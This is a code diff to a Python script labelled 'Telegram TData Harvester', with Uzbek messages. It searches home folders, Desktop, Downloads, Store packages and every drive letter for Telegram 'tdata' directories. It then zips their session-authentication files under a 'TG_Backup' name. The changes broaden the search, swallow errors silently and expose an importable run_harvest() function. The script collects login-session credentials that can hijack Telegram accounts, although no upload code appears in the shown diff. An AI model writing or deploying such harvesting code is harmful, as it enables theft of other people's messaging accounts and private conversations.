@@ -6,13 +6,12 @@ and extracts only session-critical authentication files into a lightweight, high
 
 import os
 import sys
-import shutil
 import zipfile
 import platform
 import argparse
 from pathlib import Path
 from datetime import datetime
-from typing import Set, List, Tuple
+from typing import Set, List, Tuple, Optional
 
 if sys.platform == "win32":
     try:
@@ -40,10 +39,25 @@ def find_tdata_windows() -> Set[Path]:
         user_home / "Desktop" / "Telegram Desktop" / "tdata",
     ]
     for p in possible_paths:
-        if p.exists() and p.is_dir():
-            candidates.add(p.resolve())
+        try:
+            if p.exists() and p.is_dir():
+                candidates.add(p.resolve())
+        except Exception:
+            pass
 
-    # 2. Microsoft Store UWP
+    # 2. Portable folders on Desktop & Downloads (e.g. Desktop/Telegram_2/tdata)
+    for parent_dir in [user_home / "Desktop", user_home / "Downloads"]:
+        if parent_dir.exists() and parent_dir.is_dir():
+            try:
+                for item in parent_dir.glob("*elegram*"):
+                    if item.is_dir():
+                        td = item / "tdata"
+                        if td.exists() and td.is_dir():
+                            candidates.add(td.resolve())
+            except Exception:
+                pass
+
+    # 3. Microsoft Store UWP
     packages_root = user_home / "AppData" / "Local" / "Packages"
     if packages_root.exists():
         try:
@@ -54,7 +68,7 @@ def find_tdata_windows() -> Set[Path]:
         except Exception:
             pass
 
-    # 3. Portable installations on root drives
+    # 4. Portable installations on root drives
     import string
     portable_names = ["Telegram", "TelegramDesktop", "Telegram Portable", "Telegram_2"]
     for letter in string.ascii_uppercase:
@@ -136,22 +150,62 @@ def harvest_tdata(tdata_path: Path, output_zip: Path) -> bool:
 
     files_to_pack: List[Path] = []
     for item in tdata_path.rglob("*"):
-        if item.is_file() and is_session_critical(item, tdata_path):
-            files_to_pack.append(item)
+        try:
+            if item.is_file() and is_session_critical(item, tdata_path):
+                files_to_pack.append(item)
+        except (PermissionError, OSError):
+            continue
 
     if not files_to_pack:
         print("⚠️ Muhim sessiya fayllari topilmadi!")
         return False
 
+    packed_count = 0
     with zipfile.ZipFile(output_zip, "w", zipfile.ZIP_DEFLATED, compresslevel=9) as zf:
         for f in files_to_pack:
-            arcname = f.relative_to(tdata_path.parent)
-            zf.write(f, arcname)
+            try:
+                arcname = f.relative_to(tdata_path.parent)
+                zf.write(f, arcname)
+                packed_count += 1
+            except (PermissionError, OSError) as e:
+                print(f"   ⚠️ Fayl band (o'tkazib yuborildi): {f.name} ({e})")
+
+    if packed_count == 0:
+        output_zip.unlink(missing_ok=True)
+        return False
 
     size_mb = output_zip.stat().st_size / (1024 * 1024)
     print(f"✅ Muvaffaqiyatli arxivlandi: {output_zip.name} ({size_mb:.2f} MB)")
-    print(f"   Jami kiritilgan fayllar: {len(files_to_pack)} ta")
+    print(f"   Jami kiritilgan fayllar: {packed_count} ta")
     return True
+
+
+def run_harvest(output_dir: str = ".", custom_path: Optional[str] = None) -> List[Path]:
+    os_name, os_icon = get_os_info()
+
+    print("=" * 60)
+    print(f"Telegram TData Harvester ({os_icon})")
+    print("=" * 60)
+
+    tdata_dirs = [Path(custom_path)] if custom_path else find_all_tdata()
+
+    if not tdata_dirs:
+        print("❌ Tizimda Telegram tdata papkasi topilmadi!")
+        return []
+
+    print(f"Topilgan tdata joylashuvlari ({len(tdata_dirs)} ta):")
+    for idx, td in enumerate(tdata_dirs, 1):
+        print(f"   {idx}. {td}")
+
+    created_zips: List[Path] = []
+    timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
+    for idx, td in enumerate(tdata_dirs, 1):
+        out_name = f"TG_Backup_{os_name}_{timestamp}_{idx}.zip" if len(tdata_dirs) > 1 else f"TG_Backup_{os_name}_{timestamp}.zip"
+        out_zip = Path(output_dir) / out_name
+        if harvest_tdata(td, out_zip):
+            created_zips.append(out_zip)
+
+    return created_zips
 
 
 def main():
@@ -160,27 +214,9 @@ def main():
     parser.add_argument("--path", "-p", type=str, help="Maxsus tdata papkasi yo'li (agar avtomatik topilmasa)")
 
     args = parser.parse_args()
-    os_name, os_icon = get_os_info()
-
-    print("=" * 60)
-    print(f"Telegram TData Harvester ({os_icon})")
-    print("=" * 60)
-
-    tdata_dirs = [Path(args.path)] if args.path else find_all_tdata()
-
-    if not tdata_dirs:
-        print("❌ Tizimda Telegram tdata papkasi topilmadi!")
+    zips = run_harvest(output_dir=args.output, custom_path=args.path)
+    if not zips:
         sys.exit(1)
-
-    print(f"Topilgan tdata joylashuvlari ({len(tdata_dirs)} ta):")
-    for idx, td in enumerate(tdata_dirs, 1):
-        print(f"   {idx}. {td}")
-
-    timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
-    for idx, td in enumerate(tdata_dirs, 1):
-        out_name = f"TG_Backup_{os_name}_{timestamp}_{idx}.zip" if len(tdata_dirs) > 1 else f"TG_Backup_{os_name}_{timestamp}.zip"
-        out_zip = Path(args.output) / out_name
-        harvest_tdata(td, out_zip)
 
 
 if __name__ == "__main__":
